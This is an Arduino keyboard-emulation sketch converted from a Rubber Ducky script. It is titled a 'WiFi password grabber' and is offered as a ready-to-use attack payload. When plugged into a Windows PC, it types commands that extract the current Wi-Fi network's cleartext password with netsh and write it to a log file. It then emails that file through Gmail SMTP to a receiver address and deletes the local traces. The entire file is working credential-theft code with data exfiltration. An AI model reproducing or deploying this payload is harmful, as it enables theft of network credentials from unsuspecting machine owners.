
/* Converted by LeonarDucky v1.0 */

#include <Keyboard.h>
void setup() {
Keyboard.begin();
delay(3000);
// Title: WiFi password grabber
// Author: Siem
// Version: 4
// Description: Saves the SSID, Network type, Authentication and the password to Log.txt and emails the contents of Log.txt from a gmail account.
delay(3000);
// --> Minimize all windows
delay(400);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('d');
Keyboard.releaseAll();
// --> Open cmd
delay(400);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
Keyboard.releaseAll();
delay(500);
Keyboard.print("cmd");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
delay(200);
// --> Getting SSID
Keyboard.print("cd \"%USERPROFILE%\\Desktop\" & for /f \"tokens=2 delims=:\" %A in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"BSSID\"') do set A=%A");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("set A=\"%A:~1%\"");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
// --> Creating A.txt
Keyboard.print("netsh wlan show profiles %A% key=clear | findstr /c:\"Network type\" /c:\"Authentication\" /c:\"Key Content\" | findstr /v \"broadcast\" | findstr /v \"Radio\">>A.txt");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
// --> Get network type
Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Network type\" A.txt') do set B=%A");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
// --> Get authentication
Keyboard.print("for /f \"tokens=2 delims=: \" %A in ('findstr \"Authentication\" A.txt') do set C=%A");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
// --> Get password
Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Key Content\" A.txt') do set D=%A");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
// --> Delete A.txt
Keyboard.print("del A.txt");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
// --> Create Log.txt
Keyboard.print("echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
// --> Mail Log.txt
Keyboard.print("powershell");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("$SMTPInfo.EnableSsl = $true");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD')");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("$ReportEmail.From = 'ACCOUNT@gmail.com'");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("$ReportEmail.To.Add('RECEIVER@gmail.com')");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("$ReportEmail.Subject = 'WiFi key grabber'");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("$ReportEmail.Body = (Get-Content Log.txt | out-string)");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
Keyboard.print("$SMTPInfo.Send($ReportEmail)");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
delay(1000);
Keyboard.print("exit");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
delay(500);
// --> Delete Log.txt and exit
Keyboard.print("del Log.txt & exit");
delay(400);
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll(); 
}
void loop() {}